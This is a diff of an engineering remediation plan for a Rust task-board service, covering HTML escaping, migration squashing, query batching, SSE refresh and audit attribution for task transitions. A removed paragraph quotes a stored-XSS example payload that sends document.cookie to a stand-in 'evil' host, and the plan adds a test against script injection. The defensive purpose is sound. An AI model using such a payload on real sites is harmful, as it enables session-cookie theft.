@@ -7,6 +7,10 @@ which added the correlation-chain Kanban board, the `task_status_events` ledger,
 Baseline at time of writing: `cargo build` clean, `cargo test --lib task` → 77 passed.
 Every phase below must leave both of those true.
 
+References below prefer file + symbol names over line numbers. Where a line number is retained, it
+describes commit `844e85c`; later phases deliberately move enough code that those numbers will not
+remain stable.
+
 ---
 
 ## Shared context
@@ -30,12 +34,15 @@ Every phase below must leave both of those true.
 - **Keep `async fn` chains shallow** — prefer extracting a *synchronous* helper; an `async fn` that
   only forwards is pure stack cost.
 
-### Migration convention (differs from `src/adapters/persistence/AGENTS.md`)
+### Authorized migration exception
 
 The project is pre-release and `migrations/` deliberately holds **one squashed init file**.
 Schema changes edit `migrations/20260817000000_init_schema.sql` **in place**; the database is
-reset, not migrated. `src/adapters/persistence/AGENTS.md` §1 says the opposite — it is stale on
-this point; do not follow it.
+reset, not migrated.
+
+This plan is an explicit, plan-specific exception to `src/adapters/persistence/AGENTS.md` §1,
+which otherwise requires additive migrations. Do not update that guide as part of this work; for
+this remediation only, follow the squash-and-reset workflow below.
 
 Editing the init file changes its checksum, so both databases must be recreated:
 
@@ -72,69 +79,60 @@ assertions to the company/task the test created.
 
 | Phase | Goal | Severity | Depends on |
 |-------|------|----------|-----------|
-| 1 | Escape channel/agent names on board cards (stored XSS) | **High** | — |
+| 1 | Pin existing board-card escaping with a regression test | Hardening | — |
 | 2 | Fold the additive migration into the squashed init schema | Convention | — |
 | 3 | Bound the board query; batch chain detail; scope SSE re-renders | **High** | 2 |
-| 4 | Make transition attribution unforgeable (delete the defaulting trait methods) | Medium | — |
+| 4 | Make transition attribution mandatory and row-local | Medium | 2 |
 | 5 | Correct transition reasons; make Resume actually resume | Medium | 2, 4 |
-| 6 | One source of truth for stage derivation and lease-lost | Medium | 2, 4 |
+| 6 | Enforce SQL/Rust stage parity; make lease-lost explicit | Medium | 2, 4 |
 | 7 | Structural cleanup: module split, named tuples, dead code, round trips | Low | 3–6 |
 
 Phases 1 and 2 are independent and can ship immediately. Phase 3 is the largest single win.
 
 ---
 
-## Phase 1 — Stored XSS on board cards
+## Phase 1 — Pin board-card escaping with a regression test
 
 ### Goal
 
-Channel and agent names reach the browser unescaped on every Kanban card.
+Keep operator-supplied channel and agent names escaped on every Kanban card, and leave a focused
+test that fails if either output-context escape is removed.
 
-### The defect
+### Current state
 
-`src/adapters/http/pages/task_board.rs`:
+`task_chain_card` first joins the names:
 
 ```rust
-174:    let channels = card.channel_names.join(", ");
-175:    let agents = card.agent_names.join(", ");
-...
-218:                <p class="truncate text-[11px] opacity-65">{channels}</p>
-219:                <p class="truncate text-[11px] opacity-65">{agents}</p>
+let channels = card.channel_names.join(", ");
+let agents = card.agent_names.join(", ");
 ```
 
-`channels.name` is free `TEXT` set through the UI (`migrations/20260817000000_init_schema.sql:295`);
-`agents.name` likewise. A channel named `<img src=x onerror=fetch('//evil/?'+document.cookie)>`
-executes in every operator's session that loads the board.
+but the same `format!` call already escapes both values at its named arguments:
 
-Everything else on the card is escaped (`title`, `failure_summary`, `task_type`), and the sibling
-`task_chain_detail_pane` escapes the *identical* data at `:293` via
-`escape_html_text(&participants)`. This is an oversight, not a decision.
+```rust
+channels = escape_html_text(&channels),
+agents = escape_html_text(&agents),
+```
+
+This is true in commit `844e85c`; the earlier review excerpt stopped before these arguments and
+therefore reported a stored-XSS defect that is not present. Channel and agent names are still free
+text, so the missing piece is regression coverage, not a production fix.
 
 ### Files touched
 
-- `src/adapters/http/pages/task_board.rs`
 - `src/adapters/http/pages/tests.rs`
 
 ### Design
 
-Escape at the join, so the escaped form is the only thing in scope:
-
-```rust
-let channels = escape_html_text(&card.channel_names.join(", "));
-let agents = escape_html_text(&card.agent_names.join(", "));
-```
-
-Escape after joining, not before — `", "` contains nothing that needs escaping, and one allocation
-beats N.
-
-While in the file, audit every remaining interpolation in `task_board.rs` for the same class:
+Do not move or double-apply the existing escape merely to create a production diff. Audit the
+remaining interpolations in `task_board.rs` and record the result in the test:
 
 - `task_chain_card` — `title`, `failure_summary` escaped; `short_id` is a UUID slice (safe).
 - `chain_timeline` — `event.reason`, `approval.status`, `approval.action_title`,
   `outreach.status` escaped; `delivery.status.label()` is a `&'static str` from an enum (safe).
 - `chain_task` — `task_type` escaped; the rest are enum labels and UUIDs (safe).
-- `task_board_toolbar` — `list_url` uses `escape_html_attr`; `channel_filter_options` is a
-  pre-existing shared helper, verify it escapes `channel.name` and fix there if not.
+- `task_board_toolbar` — `list_url` uses `escape_html_attr`; the shared
+  `channel_filter_options` helper already escapes `channel.name` and `channel.slug`.
 
 Note that `escape_html_attr` is currently just an alias for `escape_html_text`
 (`src/adapters/http/pages/layout.rs:640`), which escapes `& < > " '` — sufficient for both quoted
@@ -142,8 +140,8 @@ attribute values and text nodes. No unquoted attributes exist in this file.
 
 ### Tests
 
-Extend `task_board_renders_six_columns_toggle_overflow_and_live_chain_pane` in
-`src/adapters/http/pages/tests.rs:2633`, or add a focused sibling:
+Keep or add the focused sibling test
+`board_cards_escape_operator_supplied_channel_and_agent_names`:
 
 ```rust
 #[test]
@@ -158,12 +156,14 @@ fn board_cards_escape_operator_supplied_channel_and_agent_names() {
 }
 ```
 
-The negative assertion is the one that matters — it fails today.
+The negative assertion is the one that matters: it fails if the existing interpolation escape is
+ever removed. If the focused test is already present in the working tree, retain it rather than
+adding a duplicate.
 
 ### Done when
 
-- [ ] Both interpolations escaped; the whole file re-audited for the same class.
-- [ ] `channel_filter_options` confirmed escaping (or fixed).
+- [ ] Existing `task_chain_card` escaping remains unchanged and the whole file is re-audited.
+- [ ] `channel_filter_options` is confirmed to escape channel names and slugs.
 - [ ] A test asserts the raw `<script>` payload does **not** appear in the rendered board.
 - [ ] Existing page tests still pass.
 
@@ -183,8 +183,9 @@ project keeps one squashed init file, edited in place, and resets the DB.
 
 ### Design
 
-Split the 207 lines across the init file at their natural homes rather than appending a block —
-the init file is maintained as a single readable document with invariants explained inline.
+Move the 207 lines into the init file as one dependency-ordered task-ledger section. Keeping the
+new objects together avoids the contradictory requirement to place triggers beside functions that
+appear before the triggers' tables exist.
 
 Current init-file landmarks (line numbers before edit):
 
@@ -201,18 +202,18 @@ Current init-file landmarks (line numbers before edit):
 | 876 | `CREATE TABLE task_outreaches` |
 | 910 | `CREATE TABLE task_outreach_targets` |
 
-Placement:
+Placement, after `task_outreach_targets` and its indexes:
 
-1. **`CREATE TABLE task_status_events`** + its two indexes — after `task_outreach_targets` (~910).
+1. **`CREATE TABLE task_status_events`** + its two indexes.
    It has FKs to `human_approvals` and `task_outreaches`, so it must follow both. Keep the
    `-- Immutable, metadata-only history …` header comment; it explains why the table holds no
    payload.
 2. **`record_task_status_event()` + `background_tasks_record_status_event`** — immediately after
-   the table. Keep the comment about transaction-local settings; it is the only place the
-   `mail_agents.task_transition_*` contract is written down.
-3. **`notify_task_chain_changed()` + its five triggers** — at the very end of the tasks section,
-   next to `notify_thread_activity` (~692) so all three NOTIFY functions read together. Keep the
-   `-- One small, identifier-only notification …` comment.
+   the table. Keep its current transaction-local-setting comment during the pure fold; Phase 4
+   replaces that protocol and comment with the row-local attribution contract.
+3. **`notify_task_chain_changed()` + its five triggers** — immediately after the status-event
+   trigger, once every referenced table exists. Keep the `-- One small, identifier-only
+   notification …` comment.
 
 Then delete the additive file.
 
@@ -370,7 +371,7 @@ These go into the squashed init migration in place (Phase 2 should land first so
 There is no production signal for board cost today, so "we will see how it behaves in production"
 does not currently work:
 
-- `init_tracing` (`src/infra/setup.rs:195`) installs a console `fmt` layer only — no
+- `init_tracing` (`src/infra/setup.rs`, `init_tracing`) installs a console `fmt` layer only — no
   `with_span_events`, no exporter. The `#[instrument]` attributes on the board routes give span
   *context* on log lines, not durations.
 - `runtime_metric_samples` captures machine-level data (RSS, CPU, pool size,
@@ -392,16 +393,28 @@ const BOARD_QUERY_WARN_THRESHOLD: Duration = Duration::from_millis(500);
 let started = Instant::now();
 let rows = /* the board query */;
 let elapsed = started.elapsed();
-// The rollup table is justified by *working-set* growth, not history growth, so log the size of
-// the set the pushdown actually selected — that is the number the deferred plan compares against.
+// Each non-empty stage contributes rows carrying one shared stage_total. Sum one total per stage;
+// rows.len() is capped by the display limit and is not the working-set size.
+let eligible_chains = rows
+    .iter()
+    .map(|row| (&row.stage, row.stage_total))
+    .collect::<HashMap<_, _>>()
+    .into_values()
+    .sum::<i64>();
 if elapsed > BOARD_QUERY_WARN_THRESHOLD {
-    warn!(?elapsed, %company_id, chains = rows.len(), "Task board projection is slow");
+    warn!(
+        ?elapsed,
+        %company_id,
+        returned_cards = rows.len(),
+        eligible_chains,
+        "Task board projection is slow"
+    );
 }
 ```
 
-Five lines, no new infrastructure, and it turns the deferred document's trigger condition into
-something greppable. Without it the Phase 3a `EXPLAIN` baseline has nothing to be compared *to*
-later.
+This needs no new infrastructure and turns the deferred document's trigger condition into
+something greppable. `eligible_chains`, not the capped returned-card count, is the number compared
+with the Phase 3a `EXPLAIN` baseline later.
 
 Deliberately not done here: adding a column to `runtime_metric_samples`. Its schema comment warns
 that the table's CHECK constraints are coupled to its column list, so widening it is real friction
@@ -412,9 +425,8 @@ for a signal a log line already carries.
 ### 3b — Batch the chain-detail queries
 
 - Add `ChainAttemptDb` using `#[sqlx(flatten)]` so attempts carry `task_id`. Available in sqlx
-  0.8.6 and already used at `src/adapters/persistence/company.rs:54`. `OutboxEntryDb` already has
-  `task_id` (`task.rs:450`).
-- Replace the loop at `task.rs:2174` with two `WHERE task_id = ANY($2)` queries:
+  0.8.6 and already used by `AccessibleCompanyDb`. `OutboxEntryDb` already carries `task_id`.
+- Replace the per-task loop in `get_task_chain_detail` with two `WHERE task_id = ANY($2)` queries:
 
 ```sql
 SELECT attempt.task_id, attempt.attempt_number, attempt.status, attempt.error,
@@ -440,11 +452,19 @@ SELECT {OUTBOX_COLUMNS} FROM email_outbox
 const CHAIN_DETAIL_MAX_TASKS: i64 = 200;
 const CHAIN_DETAIL_MAX_ATTEMPTS: i64 = 1_000;
 const CHAIN_DETAIL_MAX_DELIVERIES: i64 = 1_000;
+const CHAIN_DETAIL_MAX_EVENTS: i64 = 200;
+const CHAIN_DETAIL_MAX_APPROVALS: i64 = 200;
+const CHAIN_DETAIL_MAX_OUTREACHES: i64 = 200;
 ```
 
-Add `truncated: bool` to `TaskChainDetail` and render it in the pane.
+Every bounded query fetches `limit + 1`, trims the sentinel row, and contributes to a single
+`truncated: bool` on `TaskChainDetail`; render a visible notice whenever any source was truncated.
+Do not infer truncation merely because a result contains exactly the limit. Keep the public
+`list_task_status_events` maximum at 200; the detail loader uses an internal event query that may
+fetch the 201st sentinel row rather than weakening the public limit.
 
-Result: 6 queries flat, down from ~405.
+Result: **7 queries flat** — header, tasks, attempts, deliveries, events, approvals and outreaches —
+down from ~405 and independent of the number of tasks returned.
 
 ---
 
@@ -464,32 +484,47 @@ fn wake_touches(wake: &Wake, selected: Option<CorrelationId>) -> bool {
 
 ```rust
 let mut refresh_selected = true;            // the first pass always paints the pane
+let period = Duration::from_secs(60);
+let mut window_tick = tokio::time::interval_at(tokio::time::Instant::now() + period, period);
 loop {
-    let filter = query.board_filter();      // recomputed per tick -> sliding window, fixes (d)
+    let filter = query.board_filter();      // recomputed for every event or timer wake
     match view.board(filter).await { /* yield task-board */ }
 
     if refresh_selected && let Some(correlation_id) = selected {
         match view.chain(correlation_id).await { /* yield task-chain */ }
     }
 
-    let Some(first) = changes.next().await else { return };
-    let mut touched = wake_touches(&first, selected);
-    while let Ok(Some(wake)) =
-        tokio::time::timeout(Duration::from_millis(75), changes.next()).await
-    {
-        touched |= wake_touches(&wake, selected);
+    tokio::select! {
+        first = changes.next() => {
+            let Some(first) = first else { return };
+            let mut touched = wake_touches(&first, selected);
+            while let Ok(Some(wake)) =
+                tokio::time::timeout(Duration::from_millis(75), changes.next()).await
+            {
+                touched |= wake_touches(&wake, selected);
+            }
+            refresh_selected = touched;
+        }
+        _ = window_tick.tick() => {
+            // The timer advances terminal_since but does not rebuild an unchanged detail pane.
+            refresh_selected = false;
+        }
     }
-    refresh_selected = touched;
 }
 ```
 
 `Wake::Lagged` must force a refresh — that is the existing "what was missed is unknown, so redo
-everything" contract the thread streams follow (`src/adapters/http/routes/ui.rs:672`).
+everything" contract the thread streams implement in their `Wake::Lagged` arm.
 
-**Reduce chatter at the source.** `email_outbox_notify_chain` fires `AFTER INSERT OR UPDATE OF
-status`, so `pending → sending → sent` emits three notifications for one delivery. Add
-`WHEN (TG_OP = 'INSERT' OR OLD.status IS DISTINCT FROM NEW.status)` to it and to
-`human_approvals_notify_chain`.
+**Suppress no-op notifications at the source.** Keep the combined INSERT/UPDATE triggers. At the
+top of `notify_task_chain_changed()`, use `TG_OP` inside the trigger function and nested
+table-specific checks to return early when an UPDATE leaves `status` unchanged. Apply this to
+`email_outbox`, `human_approvals`, and `task_outreaches`; the target-response trigger already uses
+`IS DISTINCT FROM`.
+
+Do not put `TG_OP` in a trigger `WHEN` expression, and do not claim this removes genuine
+`pending → sending → sent` notifications: those are three material state changes and remain
+eligible for the existing 75 ms stream-side coalescing.
 
 **Broadcast pressure.** `TaskChainChanged` now shares the 256-slot broadcast
 (`src/infra/events.rs:36`) with the thread streams, so thread subscribers hit `Wake::Lagged` more
@@ -509,10 +544,15 @@ if that is not enough — do not do it speculatively.
 - **Grouping, DB-backed.** A chain with 3 tasks each having attempts and deliveries; assert every
   attempt and delivery attaches to the *right* task. Association is what breaks when batching, so
   assert per-task, not totals.
-- **Truncation.** Exceed `CHAIN_DETAIL_MAX_TASKS` (or lower it under `#[cfg(test)]`); assert
-  `truncated` and the rendered notice.
+- **Truncation.** Cross each of the six detail limits separately; assert the sentinel row is
+  removed, `truncated` is set, and the rendered notice is visible. Assert an exactly-at-limit result
+  is not marked truncated.
 - **Pure, no mocks.** `wake_touches` over the full matrix — `Lagged`/`Event` × selected/none ×
   matching/non-matching.
+- **Paused-time SSE test.** Advance Tokio time past the 60-second tick with no mailbox event;
+  assert the board is refreshed with a newly computed cutoff and the selected pane is not queried.
+- **DB-backed notification test.** A no-op status UPDATE on outbox, approval, and outreach rows
+  emits no chain notification; a real status change still emits one.
 - Keep `task_chain_board_groups_by_correlation_and_keeps_complete_chain_under_channel_filter`
   green — it pins the channel-filter semantics the pushdown must not alter.
 
@@ -527,35 +567,37 @@ the order of full company history. After: bounded by working set, BitmapOr over
 **Record both numbers in the commit message.** They are the baseline that decides whether
 `plan/kanban_denormalized_rollup_table_optimization.md` is ever needed.
 
-Once deployed, the signal to watch is `Task board projection is slow` in the logs. Rising `chains`
-values on those lines mean the *working set* is growing, which is the one thing the pushdown does
-not bound and the only thing that justifies the rollup table.
+Once deployed, the signal to watch is `Task board projection is slow` in the logs. Rising
+`eligible_chains` values mean the *working set* is growing, which is the one thing the pushdown does
+not bound and the only thing that justifies the rollup table. `returned_cards` is diagnostic only
+and will plateau at the display cap.
 
 ### Done when
 
 - [ ] `eligible` selects at row level; `staged`'s filter retained unchanged.
 - [ ] Both `updated_at` indexes in the init migration; DBs recreated; `.sqlx/` regenerated.
 - [ ] Equivalence test passes across all seven branches.
-- [ ] `get_task_chain_detail` issues a fixed 6 queries regardless of chain size.
-- [ ] Attempts and deliveries bounded; truncation visible in the pane.
+- [ ] `get_task_chain_detail` issues a fixed 7 queries regardless of chain size.
+- [ ] All six detail collections are bounded with limit-plus-one detection; truncation is visible.
 - [ ] The chain pane re-renders only on its own chain, or after `Wake::Lagged`.
-- [ ] `terminal_since` slides across the life of an SSE connection.
+- [ ] A 60-second timer advances `terminal_since` even when the SSE connection receives no events.
 - [ ] `is_task_chain` has a production caller.
-- [ ] Notify triggers fire only on real status changes.
+- [ ] Outbox, approval, and outreach no-op status writes emit no chain notification.
 - [ ] Before/after `EXPLAIN` numbers recorded in the commit message.
-- [ ] `BOARD_QUERY_WARN_THRESHOLD` tripwire in place, logging elapsed time and working-set size.
+- [ ] The slow-query tripwire logs elapsed time, capped returned cards, and true working-set size.
 
 ---
 
-## Phase 4 — Make transition attribution unforgeable
+## Phase 4 — Make transition attribution mandatory and row-local
 
 ### Goal
 
-Four trait methods silently discard the attribution they exist to carry.
+Delete the four defaulting trait methods, require every stop/resume/failure call to state its
+cause, and carry the complete attribution in the same row write that changes task status.
 
 ### The defect
 
-`src/adapters/persistence/task.rs:858-895`:
+The `TaskPersistence` defaults currently have this shape:
 
 ```rust
 async fn mark_task_failed_with_reason(&self, …, _reason: TaskStopReason) -> AppResult<bool> {
@@ -573,35 +615,47 @@ writes a permanently wrong audit trail. That is the inverse of the posture the r
 takes — `commit_agent_dispatch` and the lease renewal both carry explicit "No default:" comments
 explaining why a silently-succeeding double is unacceptable.
 
-It also produces a `_as` / `_after_approval` method matrix and an `Option<Uuid>` dispatch in
-`task_worker.rs:1467-1483` and `:1542-1558` — the shape `AGENTS.md` bans under "No flag
-parameters".
+It also produces a `_as` / `_after_approval` method matrix and `Option<Uuid>` dispatch in
+`TaskWorker::stop_task_and_notify` and `TaskWorker::resume_task` — the shape `AGENTS.md` bans under
+"No flag parameters".
 
 ### Files touched
 
 - `src/adapters/persistence/task.rs`
+- `src/adapters/persistence/approval.rs`
 - `src/domain/entities/task.rs`
 - `src/application/services/task_worker.rs`
 - `src/application/use_cases/approval.rs`
 - `src/adapters/http/routes/task.rs`
 - `src/adapters/http/routes/ui_tasks.rs`
+- `migrations/20260817000000_init_schema.sql`
 - 6 mock implementors (see below)
 
 ### Design
 
-**Replace, don't add.** Collapsing the pairs into one method each removes three methods rather than
-promoting three defaults, and the mocks need only a signature update.
+**Replace, don't add.** Use narrow public cause enums for the two operations and one complete
+internal actor representation for the trigger context.
 
 Add to `src/domain/entities/task.rs`, next to `TaskTransitionReason`:
 
 ```rust
-/// Who caused a transition, in a shape that makes illegal combinations unrepresentable.
-///
-/// `actor_id: Some(..)` with `actor_kind: System` currently compiles fine and means nothing;
-/// this enum is what stops that.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum TransitionActor {
+pub enum StopActor {
+    Operator(Uuid),
+    Approval(Uuid),
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ResumeActor {
+    Operator(Uuid),
+    Approval(Uuid),
+}
+
+/// Internal representation of all valid trigger actor/source shapes.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum TransitionActor {
     System,
+    Worker(Uuid),
     Operator(Uuid),
     Approval(Uuid),
     Outreach(Uuid),
@@ -609,7 +663,7 @@ pub enum TransitionActor {
 
 impl TransitionActor {
     pub fn kind(self) -> TaskTransitionActorKind { … }
-    pub fn actor_id(self) -> Option<Uuid> { … }      // Operator only
+    pub fn actor_id(self) -> Option<Uuid> { … }      // Worker/Operator when carried directly
     pub fn approval_id(self) -> Option<Uuid> { … }
     pub fn outreach_id(self) -> Option<Uuid> { … }
 }
@@ -619,10 +673,10 @@ Then collapse the trait surface:
 
 ```rust
 // was: stop_task(id) + stop_task_as(id, operator_id)
-async fn stop_task(&self, id: Uuid, actor: TransitionActor) -> AppResult<BackgroundTask>;
+async fn stop_task(&self, id: Uuid, actor: StopActor) -> AppResult<BackgroundTask>;
 
 // was: resume_task(id) + resume_task_as(id, op) + resume_task_after_approval(id, approval)
-async fn resume_task(&self, id: Uuid, actor: TransitionActor) -> AppResult<BackgroundTask>;
+async fn resume_task(&self, id: Uuid, actor: ResumeActor) -> AppResult<BackgroundTask>;
 ```
 
 And fold the failure path's bool flag away at the same time:
@@ -645,40 +699,81 @@ pub struct TaskFailure<'a> {
 async fn mark_task_failed(&self, failure: TaskFailure<'_>) -> AppResult<bool>;
 ```
 
-No defaults on any of the three. Update `set_task_transition_context` /
-`set_task_transition_source` to take a `TransitionActor` so the two setters can no longer disagree,
-and so a caller cannot set a reason while leaving a stale source from earlier in the same
-transaction:
+No defaults on any of the three. `TaskFailure.lease.worker_id` always becomes
+`TransitionActor::Worker`; callers cannot choose a different actor for a fenced worker failure.
 
-```rust
-pub(crate) async fn set_task_transition(
-    tx: &mut sqlx::Transaction<'_, Postgres>,
-    reason: TaskTransitionReason,
-    actor: TransitionActor,
-) -> AppResult<()>
+**Chosen design — Option B: replace the transaction-local GUCs with row-local attribution.** Add
+five nullable columns to `background_tasks` in the squashed init migration:
+
+```sql
+transition_reason TEXT,
+transition_actor_kind TEXT,
+transition_actor_id UUID,
+transition_approval_id UUID,
+transition_outreach_id UUID
 ```
 
-One `SELECT set_config(...) , set_config(...), …` covering all five keys, always writing all five
-(empty string where absent). That closes the latent bug where a transaction that calls
-`set_task_transition_context` without a matching `set_task_transition_source` inherits the previous
-statement's `related_outreach_id`. Not currently reachable — every caller opens its own transaction
-— but it is one shared transaction away from being a silent mis-attribution.
+Use CHECK constraints matching the event-ledger reason and actor enums, plus a source-shape check
+that permits at most one related approval/outreach ID and requires that source ID to match its actor
+kind. A null reason requires all four actor/source columns to be null; a non-null reason requires a
+non-null actor kind. Add the approval/outreach foreign keys after those referenced tables have been
+created. Do not index these columns; they describe the latest intended transition and are not query
+dimensions.
+
+Every INSERT or status-changing UPDATE must set **all five** columns in the same statement,
+explicitly binding `NULL` for absent values. Never leave a column out of a status-changing `SET`
+list: PostgreSQL would copy the previous transition's value into the new row version and the trigger
+could not distinguish that stale value from deliberate reuse. Centralize conversion in a
+synchronous `TransitionAttribution` struct with named fields, constructed exhaustively from the
+typed actor/cause enums.
+
+Change `record_task_status_event()` to read `NEW.transition_*` directly. It writes those values into
+the immutable event row, using the deterministic insert/status fallback only when
+`NEW.transition_reason IS NULL`; Phase 5 changes the final fallback to `unknown`. Delete both Rust
+GUC setters and every `current_setting('mail_agents.task_transition_*', ...)` call.
+
+This returns fenced failure and other single-statement transitions to one database round trip. It
+also removes pooled-session state from the attribution protocol. The task row intentionally keeps
+the latest transition metadata for inspection; the event ledger remains the history. The accepted
+cost is a wider row version on the hot task table and a stricter write contract. It does not add a
+second SQL write: the five values travel in the status-changing INSERT/UPDATE that already occurs.
+
+Map the narrow causes in one place:
+
+| Cause | Reason | Internal actor |
+|------|--------|----------------|
+| `StopActor::Operator(id)` | `OperatorStopped` | `Operator(id)` |
+| `StopActor::Approval(id)` | `ApprovalRejected` | `Approval(id)` |
+| `ResumeActor::Operator(id)` | `OperatorResumed` | `Operator(id)` |
+| `ResumeActor::Approval(id)` | `ApprovalAccepted` | `Approval(id)` |
+
+Add `TaskTransitionReason::ApprovalRejected` and the corresponding schema values in this phase so
+the approval stop mapping compiles before Phase 5. Phase 5 removes the remaining raw-action mapping
+that currently chooses the wrong reason.
+
+Keep stop predicates cause-specific: an approval rejection may stop only a `pending_approval` task;
+an operator may stop the existing operational set. A cause/state mismatch must affect zero rows and
+write no ledger event.
 
 **Call-site updates:**
 
 | Site | Change |
 |------|--------|
-| `task_worker.rs:646` | `mark_task_failed_with_reason(…)` → `mark_task_failed(TaskFailure { … })` |
-| `task_worker.rs:1467` | `stop_task_and_notify(id, Option<Uuid>)` → `(id, TransitionActor)`; delete the `match operator_id` |
-| `task_worker.rs:1542` | same for `resume_task` |
-| `routes/task.rs:308,340` | pass `TransitionActor::Operator(_user.id)` |
-| `routes/ui_tasks.rs:393,420` | pass `TransitionActor::Operator(workspace.user_id)` |
-| `use_cases/approval.rs:226` | `resume_task_after_approval(id, approval.id)` → `resume_task(id, TransitionActor::Approval(approval.id))` |
+| `TaskWorker` failure path | `mark_task_failed_with_reason(…)` → `mark_task_failed(TaskFailure { … })` |
+| `TaskWorker::stop_task_and_notify` | take `StopActor`; delete the `Option<Uuid>` match |
+| `TaskWorker::resume_task` | take `ResumeActor`; delete the `Option<Uuid>` match |
+| HTTP task routes | pass `StopActor::Operator(user_id)` / `ResumeActor::Operator(user_id)` |
+| Approval accept path | pass `ResumeActor::Approval(approval.id)` |
+| Approval reject path | pass `StopActor::Approval(approval.id)` |
 
-Also at `use_cases/approval.rs:226`: the result is currently discarded with `let _ = …`. On an
-approval-accept path a failure to resume means the approval is recorded but the task never runs.
-Per "don't collapse errors into defaults", either propagate with `?` or write an explicit
-`Err(e) => warn!(…)` arm so the choice is visible and logged.
+Inventory every `INSERT INTO background_tasks` and every statement whose `SET` list includes
+`background_tasks.status`, including statements in `approval.rs`; each is part of the five-column
+protocol even if it previously relied on the trigger's status-only fallback.
+
+Both approval paths currently discard the task-transition result. Change `apply_decision` to return
+`AppResult<String>`, propagate the stop/resume error through `process_link_action`, and remove both
+`let _ = …` statements. The approval row may already be consumed, so log the approval and task IDs
+with the propagated error for reconciliation; do not pretend the side effect succeeded.
 
 **Mock implementors to update (6):**
 
@@ -689,19 +784,24 @@ Per "don't collapse errors into defaults", either propagate with `?` or write an
 - `src/application/use_cases/approval.rs:579`
 - `src/application/services/task_worker.rs:1889`
 
-Most only need the parameter added and ignored. Per `AGENTS.md`, hand-written mocks re-declared per
-file are a smell — if this phase makes the duplication painful, hoisting them into one shared
-`test_support` module is the sanctioned fix, but treat that as Phase 7 work, not a blocker here.
+Treat the listed lines as commit-`844e85c` anchors; use `impl TaskPersistence for` to locate them
+after other worktree changes. Each mock must implement the new signatures explicitly. Consolidating
+the materially different mocks is not part of this phase.
 
 ### Tests
 
 - Keep `guarded_transitions_emit_only_on_success_and_operator_actions_record_the_user` green — it
   is the regression net for this whole area.
 - Add a DB-backed test that an approval-driven resume records `actor_kind = 'approval'` and a
-  non-null `related_approval_id` (mirrors the existing `ApprovalRequested` assertion at
-  `adapters/persistence/approval.rs:727`).
-- Unit-test `TransitionActor::{kind, actor_id, approval_id, outreach_id}` — pure, no DB, exhaustive
-  over the four variants.
+  non-null `related_approval_id` (mirrors the existing `ApprovalRequested` assertion).
+- Add the corresponding approval-rejection test: `approval_rejected`, actor kind `approval`, and
+  the rejecting approval ID.
+- Unit-test all `TransitionActor` mappings, including direct worker attribution.
+- DB-backed, exercise every status-changing persistence operation twice and assert the second event
+  does not inherit any actor/source column from the first. Include approval → worker and outreach →
+  operator transitions, the combinations most likely to expose stale row metadata.
+- Schema tests reject mismatched source shapes such as actor kind `approval` without an approval ID,
+  both source IDs populated, or `system` with an actor ID.
 
 ### Done when
 
@@ -709,7 +809,11 @@ file are a smell — if this phase makes the duplication painful, hoisting them 
       `resume_task_after_approval` no longer exist.
 - [ ] No `TaskPersistence` method that carries attribution has a default body.
 - [ ] `is_dead_letter: bool` is gone from the failure path.
-- [ ] The two `set_task_transition_*` setters are one function that always writes all five keys.
+- [ ] All five attribution columns are written by every status-changing INSERT/UPDATE.
+- [ ] No transition GUC setter or `current_setting('mail_agents.task_transition_*')` remains.
+- [ ] Approval accept and reject paths propagate transition failures and carry the approval ID.
+- [ ] Worker failures and batch lease loss both produce actor kind `worker` through explicit paths.
+- [ ] Consecutive transitions cannot inherit stale actor or related-source values.
 - [ ] All 6 mocks updated; full `cargo test --lib` green.
 
 ---
@@ -735,9 +839,10 @@ with `next_retry = task.retry_count + 1`. A resumed dead-lettered task still has
 `retry_count >= max_retries`, so it re-dead-letters on its first failure. The button appears to
 work and changes nothing durable.
 
-**(b) An unattributed resume is logged as a failure.** The trigger's `CASE` has no arm for
-`failed`/`dead_letter` → `pending`, so it falls through to `ELSE 'retryable_failure'`. An operator
-resuming a failed task writes a ledger row claiming the *system* retried it.
+**(b) An unattributed resume is logged as a worker failure.** The trigger's `CASE` has no arm for
+`failed`/`dead_letter` → `pending`, so it falls through to `ELSE 'retryable_failure'`; that reason
+maps to actor kind `worker`, usually with no worker ID on this transition. Phase 4 makes operator
+and approval attribution explicit rather than teaching the trigger to guess an actor from status.
 
 **(c) Approval action strings are matched loosely.** `src/adapters/persistence/approval.rs:377`:
 
@@ -759,9 +864,11 @@ adapter boundary.
 ### Files touched
 
 - `migrations/20260817000000_init_schema.sql`
+- `src/domain/entities/approval.rs`
 - `src/domain/entities/task.rs`
 - `src/adapters/persistence/task.rs`
 - `src/adapters/persistence/approval.rs`
+- `src/application/use_cases/approval.rs`
 
 ### Design
 
@@ -770,40 +877,31 @@ adapter boundary.
 Resume serves two different intents: an operator retrying failed work, and an approval/outreach
 continuation. Only the first should reset the budget.
 
-```sql
-UPDATE background_tasks
-   SET status = 'pending',
-       run_at = CURRENT_TIMESTAMP,
-       -- An operator resuming exhausted work is asking for a fresh budget; a continuation
-       -- from approval or outreach is the same run carrying on, and keeps its count.
-       retry_count = CASE WHEN status IN ('failed', 'dead_letter') THEN 0 ELSE retry_count END,
-       worker_id = NULL, execution_generation = NULL,
-       locked_at = NULL, lock_expires_at = NULL,
-       updated_at = CURRENT_TIMESTAMP
- WHERE id = $1
-   AND status IN ('stopped', 'pending_approval', 'waiting_for_third_party_reply',
-                  'failed', 'dead_letter')
-RETURNING …
-```
+`resume_task_on` receives `ResumeActor`, converts it to row-local transition attribution, and
+derives a local `reset_retry_budget` decision from the typed actor plus the row's old state:
 
-Keying off the *old status* rather than the actor keeps the rule in one place and means the
-approval path cannot accidentally reset a budget.
+- `ResumeActor::Operator` resets to zero for `failed` and `dead_letter`.
+- It also resets a `stopped` task when `retry_count >= max_retries`, covering a dead-lettered task
+  that an operator stopped before resuming.
+- `ResumeActor::Approval` is accepted only from `pending_approval` and never resets the budget.
 
-`last_error` is deliberately left in place — it is the record of why the task died, and the pane
-shows it. Confirm this against the intended UX; if the pane should look clean after resume, clear
-it in the same `CASE`.
+Use actor-specific status predicates rather than one broad shared `WHERE`: operator resume accepts
+`stopped`, `failed`, and `dead_letter`; approval resume accepts only `pending_approval`. An actor used
+against the wrong state returns the existing not-found/conflict error and writes no event.
 
-**(b) Add the missing trigger arm, and stop the `ELSE` from lying.**
+Keep the decision in one synchronous helper and bind its result into the UPDATE; do not expose a
+boolean parameter on the trait. The same UPDATE writes all five transition columns from Phase 4.
 
-```sql
